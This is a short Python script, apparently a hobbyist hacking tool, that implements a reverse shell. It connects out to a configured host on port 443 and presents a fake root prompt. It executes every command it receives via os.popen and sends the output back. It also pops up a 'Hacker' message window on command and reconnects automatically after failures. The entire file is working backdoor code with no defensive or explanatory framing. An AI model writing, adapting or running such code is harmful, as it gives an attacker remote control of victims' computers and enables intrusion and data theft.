#C:\Python34\python.exe
from socket import *
import os,time,threading

#ip = '192.168.1.109'
ip = 'localhost'
port = 443

#def mensagem2(msg,title='Hacker'):
#	ctypes.windll.user32.MessageBoxW(0, msg, title, 1)

def mensagem(msg):
	ast='*'*len(msg)*3
	os.system('@echo off & color a & title Hacker & echo. & echo %s & echo %s & echo %s & pause > nul'%(ast,' '*(len(msg))+msg,ast))

def listener():
	try:
		client = socket()
		client.settimeout(5)

		client.connect((ip,port))
		print ('[*] connected on %s:%i\n'%(ip,port))
		client.settimeout(15)
		client.send(b'root@'+ip.encode()+b':~$')

		while True:
			try:
				#client.send('root@%s:~$ '%ip)
				command=client.recv(1024).decode()
				print(command)
				
				if command=='[*] closing connection': print('[!] connection close by remote host'); return

				elif command.startswith('mensagem'):
					try: threading._start_new_thread(mensagem,(command[9:].title(),))
					except: client.send(b'[!] command could not be executed')
					else: client.send(b' ')
					continue
				elif command.startswith('cd') and command[3:]!='': 
					try: os.chdir(command[3:])
					except: continue

				try:
					resp = os.popen(command).read()
					if resp=='': client.send(b' '); continue

				except KeyboardInterrupt: return 
				except:
					resp = b'[!] command could not be executed'
					client.send(resp.encode())
					continue
				else:
					client.send(resp.encode())
			except Exception as er:
				print('erro ta aki porra %s'%er)
				client.send(b'[!] command could not be executed')
				continue

	except KeyboardInterrupt: return 
	except Exception as er:
		print('error: %s'%er)
		#client.send(b'[!] command could not be executed')
		time.sleep(5)	
		listener()

listener()
